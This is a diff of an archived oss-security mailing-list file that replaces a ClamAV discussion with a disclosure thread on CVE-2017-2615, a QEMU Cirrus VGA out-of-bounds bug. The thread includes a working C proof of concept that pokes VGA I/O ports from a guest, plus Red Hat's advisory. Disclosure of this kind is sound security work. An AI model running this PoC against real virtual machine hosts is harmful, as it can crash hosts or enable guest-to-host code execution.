@@ -1,33 +1,140 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/01/2
-Message-ID: <1e5a78ac-a93f-f4cf-b8a2-25fde5189a63@ehuk.net>
-Date: Sun, 1 Oct 2017 08:37:55 +0100
-From: Eddie Chapman <eddie@...k.net>
-To: oss-security@...ts.openwall.com, Hanno Böck <hanno@...eck.de>
-Subject: Re: clamav: Out of bounds read and segfault in xar parser
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/22/1
+Message-ID: <143C0AFC63FC204CB0C55BB88F3A8ABB33336204@EX02.corp.qihoo.net>
+Date: Wed, 22 Feb 2017 03:43:06 +0000
+From: 李强 <liqiang6-s@....cn>
+To: oss security list <oss-security@...ts.openwall.com>
+CC: P J P <ppandit@...hat.com>
+Subject: RE: CVE-2017-2615 Qemu: display: cirrus: oob access while doing bitblt copy backward mode
 Content-Type: text/plain; charset=utf-8
 
-On 29/09/17 14:09, Hanno Böck wrote:
-> Meta-level comment:
-> It seems to me clamav development has mostly stalled. Detection rates
-> are very low and I'm considering to stop using it for mail filtering.
-> (also there's of course the whole AV debate, however I never saw
-> clamav as a security tool, more as something like a spam filter that
-> prevents crap in my inbox. Still of course it needs to have secure
-> parsers.)
+FYI
 
-I agree with much of this, and I think you're right that the 
-effectiveness of Clamav in mail filtering contexts can be debated, 
-though maybe more in terms of the AV debate, as you say.  As a user 
-myself with it deployed filtering multi-user domains, I agree that 
-detection rates are low.
+The PoC for this is below:
 
-However, checking just now on Github I do not get the impression at all 
-that development has stalled. Judging purely by number of commits, every 
-month there are consistently a very healthy number. But what has stalled 
-is stable releases; the last one being 0.99.2 on 22nd April 2016, so 
-something is not quite right. But I've seen many open source/free 
-software projects stalled over the years and definitely Clamav does not, 
-IMO, fit that description (at least not yet).
+/*
+ *  CVE-2017-2615 PoC
+ *
+ *  Qiang Li of the Gear Team, Qihoo 360 Inc.
+ *
+ *  #gcc poc.c -o poc
+ *  #./poc
+ *
+*/
+#include <sys/io.h>
+#include <stdio.h>
 
-Eddie
+void write_sr(int idx,int val)
+{
+      outb(idx,0x3c4);
+	outb(val,0x3c5);
+}
+void write_gr(int idx,int val)
+{
+	outb(idx,0x3ce);
+	outb(val,0x3cf);
+}
+
+
+int main()
+{
+	iopl(3);
+	write_sr(0x07,1);
+	write_gr(0x31,0x80);
+	write_gr(0x26,0xff);
+	write_gr(0x27,0xff);
+	write_gr(0x24,1);
+	write_gr(0x20,0xff);
+	write_gr(0x21,0xff);
+	write_gr(0x22,0x0);
+	write_gr(0x23,0x0);
+
+	write_gr(0x28,0);
+	write_gr(0x29,0);
+	write_gr(0x2a,0);
+	write_gr(0x2c,0xff);
+	write_gr(0x2d,0xff);
+	write_gr(0x2e,0xff);
+
+	write_gr(0x30,1);
+	write_gr(0x2a,0);
+
+    return 0;
+}
+
+
+Thanks.
+
+--
+Li Qiang / the Gear Team, Qihoo 360 Inc
+
+> -----Original Message-----
+> From: 李强
+> Sent: Monday, February 13, 2017 8:22 PM
+> To: oss security list
+> Cc: 'P J P'
+> Subject: RE: CVE-2017-2615 Qemu: display: cirrus: oob access while doing bitblt
+> copy backward mode
+> 
+> Hello all,
+> 
+> This is Li Qiang from the Gear Team, Qihoo 360 inc. I have discovered this
+> vulnerability and make a patch for this, though not complete. When I send
+> patch to fix this issue, I did know the Cirrus vga is not the default vga in qemu.
+> So I just treat this as a normal issue. But afterwards we discovered that the
+> libvirt and xen use this vga as default.
+> We tested a lot of cloud platform in China, every of them uses the Cirrus vga as
+> default. Most of them is affected by this issue. The only one doesn't be affected
+> I think have fixed this issue. So we think this issue should be got more attention.
+> We strongly commend every cloud platform treat this issue seriously. Though
+> this vulnerability has been fixed for 10+ days, For responsible vulnerability
+> disclosure, we will not public the PoC in this email. The PoC will be public later.
+> 
+> Thanks.
+> 
+> --
+> Li Qiang / the Gear Team, Qihoo 360 Inc.
+> 
+> 
+> > -----Original Message-----
+> > From: P J P [mailto:ppandit@...hat.com]
+> > Sent: Wednesday, February 01, 2017 5:50 PM
+> > To: oss security list
+> > Cc: 李强
+> > Subject: CVE-2017-2615 Qemu: display: cirrus: oob access while doing
+> > bitblt copy backward mode
+> >
+> >    Hello,
+> >
+> > Quick emulator(Qemu) built with the Cirrus CLGD 54xx VGA Emulator
+> > support is vulnerable to an out-of-bounds access issue. It could occur
+> > while copying VGA data via bitblt copy in backward mode.
+> >
+> > A privileged user inside guest could use this flaw to crash the Qemu
+> > process resulting in DoS OR potentially execute arbitrary code on the
+> > host with privileges of Qemu process on the host.
+> >
+> > Upstream patch
+> > --------------
+> >    ->
+> > https://lists.gnu.org/archive/html/qemu-devel/2017-02/msg00015.html
+> >
+> > It fixes
+> >    ->
+> >
+> http://git.qemu.org/?p=qemu.git;a=commit;h=d3532a0db02296e687711b8cdc
+> > 7791924efccea0
+> >
+> > Reference:
+> > ----------
+> >    -> https://bugzilla.redhat.com/show_bug.cgi?id=1418200
+> >
+> > This issue was reported by Li Qiang of 360.cn Inc.
+> >
+> > CVE-2017-2615 was assigned to this issue by Red Hat Inc.
+> >
+> > Thank you.
+> > --
+> > Prasad J Pandit / Red Hat Product Security Team 47AF CE69 3A90 54AA
+> > 9045
+> > 1053 DD13 3D32 FE5B 041F
